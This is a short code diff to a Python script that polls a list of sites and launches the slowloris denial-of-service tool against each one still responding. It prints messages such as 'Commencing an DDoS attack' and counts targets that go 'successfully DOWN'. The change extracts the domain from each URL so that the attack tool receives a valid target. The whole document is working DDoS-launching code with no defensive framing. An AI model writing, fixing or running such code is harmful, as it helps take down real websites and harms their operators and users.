@@ -4,7 +4,7 @@ from time import sleep
 from flask import Flask
 from requests import get
 from requests.exceptions import RequestException
-
+from urllib.parse import urlparse
 
 app = Flask(__name__)
 
@@ -51,7 +51,8 @@ if __name__ == '__main__':
                 printo(f'{s} still responding!', color=3)
                 printo(f'Commencing an DDoS attack on {s}!', color=2)
                 # subprocess.Popen(["slowloris", s])
-                os.spawnl(os.P_NOWAIT, f'slowloris', s)
+                domain = urlparse(s).netloc
+                os.spawnl(os.P_NOWAIT, f'slowloris', domain)
             except RequestException:
                 down += 1
                 printo(f'{s} successfully DOWN', color=1)
